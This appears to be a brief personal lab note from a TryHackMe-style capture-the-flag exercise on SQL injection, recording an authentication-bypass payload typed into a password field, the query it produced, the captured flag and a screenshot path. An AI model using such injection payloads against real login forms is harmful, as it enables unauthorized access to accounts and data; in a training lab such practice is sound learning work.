# Level Two — Blind SQLi (Task 6)

**Date recorded:** 2025-09-23

**Payload used (password field):**
' OR 1=1;--

markdown
Copy code

**Transformed query:**
select * from users where username='' and password='' OR 1=1;

markdown
Copy code

**Flag obtained:** THM{SQL_INJECTION_9581}

**Screenshot:** ../screenshot/level2/l2-step1.png
